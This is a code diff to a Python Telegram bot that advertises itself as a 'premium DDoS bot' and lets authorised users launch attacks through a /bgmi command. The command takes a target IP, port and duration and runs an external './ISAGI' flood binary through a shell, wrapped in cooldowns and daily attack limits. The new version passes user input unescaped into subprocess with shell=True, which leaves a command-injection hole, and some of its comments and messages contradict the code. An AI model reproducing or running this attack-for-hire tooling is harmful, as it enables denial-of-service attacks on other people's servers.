@@ -75,7 +75,7 @@ def welcome_start(message):
 
     user_name = message.from_user.first_name
     response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss..
-🤖Try To Run This Command : /help 
+Try To Run This Command : /help 
 '''
     bot.reply_to(message, response)
 
@@ -333,117 +333,41 @@ def show_user_id(message):
     response = f"🤖Your ID: {user_id}"
     bot.reply_to(message, response)
 
-
-# /OPXTF Command
+# Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
-def TF_command(message):
-    global active_attacks
-    user_id = message.from_user.id
-
-    reset_daily_counts()
-
-    if user_id in user_bans:
-        ban_expiry = user_bans[user_id]
-        if datetime.now() < ban_expiry:
-            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
-            minutes, seconds = divmod(remaining_ban_time, 60)
-            bot.send_message(
-                message.chat.id,
-                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣g 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. Please  𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
-            )
-            return
-        else:
-            del user_bans[user_id]
-
-    if active_attacks >= MAX_ACTIVE_ATTACKS:
-        bot.send_message(
-            message.chat.id,
-            "⚠️𝗕𝗛𝗔𝗜 𝗦𝗔𝗕𝗥 𝗥𝗔𝗞𝗛𝗢! 𝗔𝗕𝗛𝗜 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗛𝗔𝗟 𝗥𝗔𝗛𝗘 𝗛𝗔𝗜! 🚀, \n\n ATTACK FINISH HONE DE."
-        )
-        return
-
-    if user_id not in EXEMPTED_USERS:
-        if user_id in user_cooldowns:
-            cooldown_time = user_cooldowns[user_id]
-            if datetime.now() < cooldown_time:
-                remaining_time = (cooldown_time - datetime.now()).seconds
-                minutes, seconds = divmod(remaining_time, 60)
-                bot.send_message(
-                    message.chat.id,
-                    f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {minutes} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {seconds} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️ "
-                )
+def handle_bgmi(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        # Check if the user is in admin_id (admins have no cooldown)
+        if user_id not in admin_id:
+            # Check if the user has run the command before and is still within the cooldown period
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
+                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
+                bot.reply_to(message, response)
                 return
-
-        if user_id not in user_attacks:
-            user_attacks[user_id] = 0
-
-        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
-            bot.send_message(
-                message.chat.id,
-                f"𝙃𝙞 {message.from_user.first_name}, BHAI APKI AJ KI ATTACK LIMIT HOGYI HAI AB DIRECT KAL ANA  ✌️"
-            )
-            return
-
-        if user_id in user_attacks and user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
-            user_bans[user_id] = datetime.now() + BAN_DURATION
-            bot.send_message(
-                message.chat.id,
-                f"𝙃𝙞 {message.from_user.first_name}, ⚠️💀 DEKH BHAI TU NE FEEDBACK NHI DIYA ISLIYE.\n\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 10 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
-            )
-            return
-
-    try:
-        args = message.text.split()[1:]
-        logging.info(f"Received arguments: {args}")
-
-        if len(args) != 3:
-            raise ValueError("✅ Usage :- /bgmi <target> <port> <time>")
-
-        target_ip, target_port, user_duration = args
-
-        if not is_valid_ip(target_ip):
-            raise ValueError("Invalid IP address.")
-        if not is_valid_port(target_port):
-            raise ValueError("Invalid port number.")
-        if not is_valid_duration(user_duration):
-            raise ValueError("Invalid duration. Must be a positive integer.")
-
-        if user_id not in EXEMPTED_USERS:
-            user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
-            user_photos[user_id] = False
-            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
-
-        default_duration = 150
-        remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
-        username = message.from_user.username if message.from_user.username else message.from_user.first_name
-
-        bot.send_message(
-            message.chat.id,
-            f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip} : {target_port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] \n\n⚠️𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔⚠️ :- {remaining_attacks}\n\n★[𝔸𝕋𝕋𝔸ℂ𝕂𝔼ℝ 𝙉𝘼𝙈𝙀]★:- @{username}\n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
-        )
-        logging.info(f"Attack started by @{username}: ./ISAGI {target_ip} {target_port} {default_duration} 900")
+            # Update the last time the user ran the command
+            bgmi_cooldown[user_id] = datetime.datetime.now()
         
-        active_attacks += 1
-        asyncio.create_task(run_attack_command_async(message.chat.id, target_ip, int(target_port), default_duration, user_duration, username))
+        command = message.text.split()
+        if len(command) == 4:  # Updated to accept target, time, and port
+            target = command[1]
+            port = int(command[2])  # Convert time to integer
+            time = int(command[3])  # Convert port to integer
+            if time > 300:
+                response = "Error: Time interval must be less than 301."
+            else:
+                record_command_logs(user_id, '/bgmi', target, port, time)
+                log_command(user_id, target, port, time)
+                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                full_command = f"./ISAGI {target} {port} {time} 900"
+                subprocess.run(full_command, shell=True)
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+        else:
+            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+    else:
+        response = " You Are Not Authorized To Use This Command ."
 
-    except Exception as e:
-        bot.send_message(message.chat.id, str(e))
-
-async def run_attack_command_async(chat_id, target_ip, target_port, duration, user_duration, username):
-    global active_attacks
-    try:
-        command = f"./ISAGI {target_ip} {target_port} {duration} 900"
-        process = await asyncio.create_subprocess_shell(command)
-        await process.communicate()
-        bot.send_message(
-            chat_id,
-            f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target_ip}\n𝐏𝐨𝐫𝐭: {target_port}\n𝐓𝐢𝐦𝐞: {duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
-        )
-    except Exception as e:
-        bot.send_message(chat_id, f"Error running attack command: {e}")
-    finally:
-        active_attacks -= 1
-
+    bot.reply_to(message, response)
     
 # /status Command
 @bot.message_handler(commands=['status'])
